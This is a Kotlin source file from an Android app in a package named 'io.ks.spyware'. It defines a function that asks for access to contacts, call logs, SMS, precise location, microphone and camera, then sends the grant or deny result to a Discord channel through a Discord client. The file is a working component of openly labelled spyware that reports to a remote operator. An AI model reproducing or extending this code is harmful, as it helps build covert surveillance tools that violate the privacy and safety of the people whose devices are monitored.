package io.ks.spyware

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.core.content.ContextCompat

@Composable
fun RequestPermissionsAndExitIfDenied(context: Context) {
    val permissions = listOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA
    )
    var allGranted by remember {
        mutableStateOf(
            permissions.all {
                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
            }
        )
    }

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val permissionStatusLog = buildString {
            result.forEach { (permission, isGranted) ->
                val status = if (isGranted) "GRANTED" else "DENIED"
                append("Permission: $permission -> $status\n")
            }
        }
        DiscordClientManager.discordClient?.sendMessage("> Permission",permissionStatusLog)
        allGranted = result.all { it.value }

    }

    LaunchedEffect(Unit) {
        if (!allGranted) {
            launcher.launch(permissions.toTypedArray())
        }
    }
}